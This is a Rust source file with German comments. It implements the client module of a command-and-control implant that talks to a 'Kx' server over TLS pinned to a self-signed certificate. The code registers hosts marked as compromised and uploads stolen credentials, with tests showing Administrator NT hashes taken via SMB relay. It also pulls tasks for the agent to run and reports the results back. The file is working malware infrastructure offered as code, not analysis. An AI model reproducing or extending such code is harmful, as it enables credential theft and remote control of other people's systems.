//! C2-Kommunikation: Client für den Kx-Server.
//!
//! Nutzt ureq mit rustls für TLS-Requests mit Bearer-Token. Das
//! Server-Zertifikat wird via `server_cert` (PEM-Pfad) übergeben und
//! vertraut gemacht; eine Verifikation gegen die System-Store ist nicht
//! möglich, da der Server selbstsignierte Zertifikate verwendet.
//!
//! Die Nachrichten selbst sind nicht hier definiert, sondern in
//! `kx_core::c2` — der Agent und der Server sprechen denselben Vertrag.

use kx_core::c2::{
    RegisterRequest, SecretUpload, Task, TaskResultRequest, PATH_REGISTER, PATH_SECRETS,
    PATH_TASKS, PATH_TASKS_RESULT,
};
use thiserror::Error;
use ureq::Agent;

/// Fehler bei der C2-Kommunikation.
#[derive(Debug, Error)]
pub enum C2Error {
    /// ureq-Request fehlgeschlagen.
    #[error("HTTP-Request fehlgeschlagen: {0}")]
    Http(String),
    /// TLS-Setup fehlgeschlagen.
    #[error("TLS-Setup fehlgeschlagen: {0}")]
    Tls(String),
    /// Antwort-JSON konnte nicht geparst werden.
    #[error("Antwort-JSON ungültig: {0}")]
    Json(String),
}

/// C2-Client mit ureq-Agent und Auth-Token.
pub struct C2Client {
    agent: Agent,
    base_url: String,
    token: String,
}

impl C2Client {
    /// Erzeugt einen Client für den angegebenen Server.
    ///
    /// `server_cert`: PEM-Pfad zum Server-Zertifikat (vertraut gemacht).
    pub fn new(server: &str, token: &str, server_cert: &str) -> Result<Self, C2Error> {
        let cert_pem = std::fs::read(server_cert)
            .map_err(|e| C2Error::Tls(format!("Zertifikat nicht lesbar: {e}")))?;
        let client_config =
            kx_tls::client_config_trusting(&cert_pem).map_err(|e| C2Error::Tls(e.to_string()))?;
        let agent = ureq::AgentBuilder::new().tls_config(client_config).build();
        Ok(Self {
            agent,
            base_url: server.trim_end_matches('/').to_string(),
            token: token.to_string(),
        })
    }

    /// Registriert einen Host unter `/api/register`.
    pub async fn register_host(&self, req: &RegisterRequest) -> Result<(), C2Error> {
        let url = format!("{}{PATH_REGISTER}", self.base_url);
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .send_json(ureq::serde_json::to_value(req).map_err(|e| C2Error::Json(e.to_string()))?)
            .map_err(|e| C2Error::Http(e.to_string()))?;
        ensure_ok(resp).await
    }

    /// Lädt ein Secret unter `/api/secrets` hoch. Die Ziel-Host-Kennung steht im
    /// Upload selbst — sie kann nicht mehr auseinanderlaufen.
    pub async fn upload_secret(&self, upload: &SecretUpload) -> Result<(), C2Error> {
        let url = format!("{}{PATH_SECRETS}", self.base_url);
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .send_json(
                ureq::serde_json::to_value(upload).map_err(|e| C2Error::Json(e.to_string()))?,
            )
            .map_err(|e| C2Error::Http(e.to_string()))?;
        ensure_ok(resp).await
    }

    /// Holt die offenen Tasks unter `/api/tasks`.
    ///
    /// Der Agent filtert selbst nach seiner eigenen Host-Kennung und dem
    /// Status `pending` — der Server kennt keinen Auftrag, der nur für einen
    /// bestimmten Agenten bestimmt ist.
    pub async fn fetch_tasks(&self) -> Result<Vec<Task>, C2Error> {
        let url = format!("{}{PATH_TASKS}", self.base_url);
        let resp = self
            .agent
            .get(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .call()
            .map_err(|e| C2Error::Http(e.to_string()))?;
        let body = resp
            .into_string()
            .map_err(|e| C2Error::Http(e.to_string()))?;
        serde_json::from_str(&body).map_err(|e| C2Error::Json(e.to_string()))
    }

    /// Meldet das Ergebnis eines ausgeführten Tasks unter
    /// `/api/tasks/result` zurück.
    pub async fn report_task_result(&self, report: &TaskResultRequest) -> Result<(), C2Error> {
        let url = format!("{}{PATH_TASKS_RESULT}", self.base_url);
        let resp = self
            .agent
            .post(&url)
            .set("Authorization", &format!("Bearer {}", self.token))
            .send_json(
                ureq::serde_json::to_value(report).map_err(|e| C2Error::Json(e.to_string()))?,
            )
            .map_err(|e| C2Error::Http(e.to_string()))?;
        ensure_ok(resp).await
    }
}

/// Prüft den HTTP-Status; gibt bei Fehlern einen C2Error zurück.
async fn ensure_ok(resp: ureq::Response) -> Result<(), C2Error> {
    if resp.status() == 201 || resp.status() == 200 {
        Ok(())
    } else {
        let status = resp.status();
        let body = resp.into_string().unwrap_or_else(|_| "<binär>".into());
        Err(C2Error::Http(format!("Status {status}: {body}")))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn register_request_serializes_host_id() {
        let req = RegisterRequest {
            host_id: "192.168.1.5".into(),
            ip: "192.168.1.5".into(),
            hostname: Some("srv1".into()),
            os: Some("Windows".into()),
            status: Some(kx_core::c2::STATUS_COMPROMISED.into()),
            sealed_master: None,
            master_key: None,
        };
        let v = ureq::serde_json::to_value(&req).unwrap();
        assert_eq!(v["ip"], "192.168.1.5");
        assert_eq!(v["host_id"], "192.168.1.5");
    }

    /// Der Upload trägt die Ziel-Host-Kennung selbst — es gibt keine zweite
    /// Stelle mehr, an der sie auseinanderlaufen könnte.
    #[test]
    fn secret_upload_carries_its_host_id() {
        let upload = SecretUpload {
            host_id: "192.168.1.5".into(),
            cred_type: "nt_hash".into(),
            username: "Administrator".into(),
            password: "hash".into(),
            source: Some("smb_relay".into()),
            master_key: None,
        };
        let v = ureq::serde_json::to_value(&upload).unwrap();
        assert_eq!(v["host_id"], "192.168.1.5");
        assert_eq!(v["source"], "smb_relay");
    }

    #[test]
    fn client_uses_the_contract_paths() {
        assert_eq!(PATH_REGISTER, "/api/register");
        assert_eq!(PATH_SECRETS, "/api/secrets");
        assert_eq!(PATH_TASKS, "/api/tasks");
        assert_eq!(PATH_TASKS_RESULT, "/api/tasks/result");
    }
}
